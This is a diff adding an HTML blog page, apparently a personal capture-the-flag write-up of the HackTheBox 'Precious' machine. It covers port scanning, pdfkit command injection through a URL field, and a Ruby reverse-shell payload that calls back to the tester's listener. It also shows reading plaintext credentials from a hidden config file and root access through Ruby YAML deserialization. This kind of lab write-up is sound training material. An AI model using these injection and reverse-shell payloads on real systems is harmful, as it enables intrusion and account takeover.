@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<style>
+    body {
+        background-color: #363636;
+        /* background-color:bisque; */
+        color: whitesmoke;
+        font-family:Arial, Helvetica, sans-serif
+    }
+
+    a {
+        text-decoration: none; 
+        color: inherit;
+    }
+
+    .topnav {
+        background-color: #242424;
+        overflow: hidden;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        right: 0;
+    }
+
+    .topnav .name {
+        float: left;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-size: 17px;
+    }
+
+    .topnav a {
+        float: right;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        font-size: 17px;
+    }
+
+
+    .topnav a:hover {
+        background-color: #ddd;
+        text-decoration-line: underline;
+        color: black;
+    }
+
+    .topnav a.active {
+        background-color:#0077ff;
+        color:white;
+    }
+
+    .topnav .center-topnav {
+        margin: auto;
+        width: 80%;
+        max-width: 930px
+    }
+
+    .content {
+        margin: auto;
+        width: 80%;
+        max-width: 900px;
+        padding-top: 50px;
+        display: grid;
+        line-height: 1.5em;
+        /* border-color: #0077ff; border-width: 2px; border-style: solid; */
+    }
+
+
+
+    .content p {
+        margin-bottom:0px;
+    }
+
+    /* .content .cell {
+        border-color: green;
+        border-width: 2px;im al
+        border-style: solid;
+    } */
+
+    .content .cell .text {
+        margin:auto;
+        text-align: center;
+    }
+
+    .content h2 {
+        margin-top:40px;
+        margin-bottom:0px;
+    }
+
+    .content h3 {
+        margin-bottom:0px;
+    }
+
+    .content .box-icon {
+        display: block;
+        width: 20%;
+    }
+
+    pre {
+        overflow: auto;
+    }
+
+    pre code {
+        background-color: #000;
+        border: 1px solid #999;
+        display: block;
+        padding: 15px;
+        overflow: auto;
+    }
+
+    img {
+        width: 80%
+    }
+
+    h1, h2 {
+        color:#0077ff
+    }
+
+    h3 {
+        color:#99c9ff
+    }
+
+</style>
+
+<head>
+    <div class="topnav">
+        <div class="center-topnav">
+            <a href=/index.html class="name">Jaguar Perlas</a>
+            <a class="active" href="/hack/hacks/index.html">Hacks</a>
+            <a href="/hack/about.html">About me</a>
+            <a href="/hack/index.html">Home</a>
+        </div>
+    </div>
+</head>
+
+<body>
+    <div class="content">
+
+        <h1>[Easy] Precious</h1>
+        <img class="box-icon" src="/hack/images/precious.png"></img>
+        <p><i>Compromised on February 8, 2023</br>Written on February 5, 2024</i></p>
+        <p>Precious is my sixth machine to compromise on HackTheBox. This Linux machine features a Command Injection vulnerability,
+            hardcoded and plaintext credentials, and a YAML deserialization vulnerability in a Ruby script.
+        </p>
+        <h2>Enumeration</h2>
+        <h3>Nmap</h3>
+        <p>Let's start with an Nmap scan.</p>
+        <pre><code>nmap 10.10.11.189 -p- --min-rate=5000</code></pre>
+        <img src="../images/precious1.png">
+        <p>We see that port 80 and 22 are open. Let's get more details and their version by using Nmap scripts.</p>
+        <pre><code>nmap 10.10.11.189 -p80,22 -sC -sV --min-rate=5000</code></pre>
+        <img src="../images/precious2.png">
+        <p>It looks like port 22 is using regular OpenSSH 8.4p1 and port 80 is an Nginx server.</p>
+        <h3>Website - TCP Port 80</h3>
+        <p>If we try to navigate to http://10.10.11.189, it'll redirect us to precious.htb and prompt an error.
+            We'll add precious.htb to our /etc/hosts file and link it to 10.10.11.189.</p>
+        <pre><code>echo "10.10.11.189 precious.htb" | sudo tee -a /etc/hosts</br>cat /etc/hosts</code></pre>
+        <img src="../images/precious3.png">
+        <p>Navigating to http://10.10.11.189 will now load the website.</p>
+        <img src="../images/precious4.png">
+        <p>Judging by the contents of the page, users will enter a URL to a webpage and convert it to a PDF file.
+            Let's test this by first setting up an HTTP server using Python.</p>
+        <pre><code>python3 -m http.server</code></pre>
+        <img src="../images/precious5.png">
+        <p>Then we'll enter our IP address and port and submit. It looks like we got a request from the server.</p>
+        <img src="../images/precious6.png">
+        <p>This must be vulnerable to Command Injection. I suspect that a shell command is being used to send a request
+            to the URL, like cURL or wget, and transformed to a PDF.</p>
+        <p>To verify my suspicion, I escaped a bash command at the end of the URL which should execute when the web app
+            processes the URL. The result of the bash command should appear on my HTTP server as a request. Turns out, I 
+            was right. The system executed the "id" command and confirmed the Linux user's identity.</p>
+        <pre><code>http://10.10.14.3:8000/test$(id)</code></pre>
+        <img src="../images/precious7.png">
+
+        <h2>Exploit - Command Injection</h2>
+        <p>Since the target user's username is "ruby", it's safe to assume that the web application is using Ruby.
+            We'll use a Ruby command to establish a reverse shell. First, let's set up our listener.</p>
+        <pre><code>nc -lvnp 4444</code></pre>
+        <img src="../images/precious8.png">
+        <p>Then we'll make the target machine execute a Ruby command to send a reverse shell to our listener.</p>
+        <pre><code>http://10.10.14.3:8000/test$(ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.3",4444))')</code></pre>
+        <img src="../images/precious9.png">
+        <p>Unfortunately, this doesn't work.</p>
+        <p>I decided to do some more enumeration. The web application's functionality actually downloads a PDF file. Maybe we can find
+            what software the web application is using to create it's PDFs. I downloaded a PDF and used exiftool to look into the PDF's metadata.
+            It looks like the web application is using pdfkit v0.8.6.</p>
+        <pre><code>cd Downloads</br>exiftool 9fb2drjc77s6coj55fr3lu1hk70vpnhl.pdf</code></pre>
+        <img src="../images/precious10.png">
+        <p>Searching online, we do find documentation on an Command Injection vulnerability. According to this documentation, if there's a
+            URL encoded character (which we didn't have originally) and a shell command substitution string, the full command will execute.
+        </p>
+        <img src="../images/precious11.png">
+        <p>I added "%20" just before my shell command substitution, and it worked.</p>
+        <pre><code>http://10.10.14.3:8000/test%20$(ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.3",4444))')</code></pre>
+        <img src="../images/precious12.png">
+
+        <h2>Privilege Escalation - Henry</h2>
+        <p>I'll upgrade my simple shell to a fully interactive TTY by using Python.</p>
+        <pre><code>python3 -c "import pty; pty.spawn('/bin/bash')";</code></pre>
+        <img src="../images/precious13.png">
+        <p>Searching around the file system, the user flag isn't in ruby's home directory. Although, there's another user named "henry".</p>
+        <pre><code>cd /home</br>ls -la</code></pre>
+        <img src="../images/precious14.png">
+        <p>Henry's credentials can be found in ruby's home directory within hidden files.</p>
+        <pre><code>cd ruby</br>ls -la</br>cd .bundle</br>ls -la</br>cat config</code></pre>
+        <img src="../images/precious15.png">
+        <p>Trying to SSH into the target machine as Henry, the credentials work.</p>
+        <pre><code>ssh henry@10.10.11.189</code></pre>
+        <img src="../images/precious16.png">
+        <p>We got user flag.</p>
+        <pre><code>cat user.txt</code></pre>
+        <img src="../images/precious16a.png">
+
+        <h2>Privilege Escalation - Root</h2>
+        <p>Once logged in, I checked if Henry can run anything as root. Henry can run a ruby script as root.</p>
+        <pre><code>sudo -l</code></pre>
+        <img src="../images/precious17.png">
+        <p>Taking a look at the script, a line stands out to me which reads and loads a file.</p>
+        <pre><code>cat /opt/update_dependencies.rb</code></pre>
+        <img src="../images/precious18.png">
+        <p>When viewing Ruby documentation about YAML.load(), we see a security note about arbitrary code execution.</p>
+        <img src="../images/precious19.png">
+        <p>We can easily find code that exploits YAML.load(), taking advantage of YAML deserialization in Ruby.</p>
+        <img src="../images/precious20.png">
+        <p>I've copied and pasted the code into a file named dependencies.yml. Since the code in /opt/update_dependencies.rb does not
+            use an absolute path to locate the file dependencies.yml, the program will search for the file in whatever directory we're in.
+            Running the file, we confirm the identity of the root user.</p>
+        <pre><code>sudo -u root /usr/bin/ruby /opt/update_dependencies.rb</code></pre>
+        <img src="../images/precious21.png">
+        <p>I'll update the code so it'll run /bin/bash as root.</p>
+        <pre><code>cat dependencies.yml</code></pre>
+        <img src="../images/precious22.png">
+        <p>Now if we run it, we'll get a root shell.</p>
+        <pre><code>sudo -u root /usr/bin/ruby /opt/update_dependencies.rb</code></pre>
+        <img src="../images/precious23.png">
+        <p>Got root flag.</p>
+        <img src="../images/precious24.png">
+
+    </div>
+</bo11dy>
+
+</html>
